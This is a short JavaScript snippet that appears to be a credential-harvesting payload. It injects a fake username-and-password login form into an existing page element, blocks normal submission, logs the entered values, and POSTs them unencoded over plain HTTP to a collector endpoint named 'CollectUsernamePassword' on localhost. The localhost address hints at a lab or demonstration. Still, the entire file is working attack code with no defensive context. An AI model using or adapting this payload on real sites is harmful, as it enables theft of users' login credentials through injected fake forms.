var form = document.createElement("form");
form.setAttribute("method", "POST");
form.setAttribute("accept-charset", "utf-8");
form.setAttribute("action", "");
form.setAttribute("id", "myform");

var input_username = document.createElement("input");
input_username.setAttribute("name", "username");
input_username.setAttribute("type", "text");
input_username.setAttribute("id", "username");
input_username.setAttribute("placeholder", "username");

var input_password = document.createElement("input");
input_password.setAttribute("name", "password");
input_password.setAttribute("type", "password");
input_password.setAttribute("id", "password");
input_password.setAttribute("placeholder", "password");

var input_submit_button = document.createElement("input");
input_submit_button.setAttribute("name", "submit");
input_submit_button.setAttribute("value", "Log in");
input_submit_button.setAttribute("type", "submit");

form.appendChild(input_username);
form.appendChild(document.createElement("br"));
form.appendChild(input_password);
form.appendChild(document.createElement("br"));
form.appendChild(document.createElement("br"));
form.appendChild(input_submit_button);

document.getElementsByClassName('form-container')[0].appendChild(form);

form.addEventListener("submit", function (event) {
    event.preventDefault();
    event.stopPropagation();
    if (event.target && event.target.id == 'myform') {
        var xmlhttp = new XMLHttpRequest();
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;
        console.log(username, password);
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://localhost:1615/API/CollectUsernamePassword');
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('username=' + username + '&password=' + password);
    }
})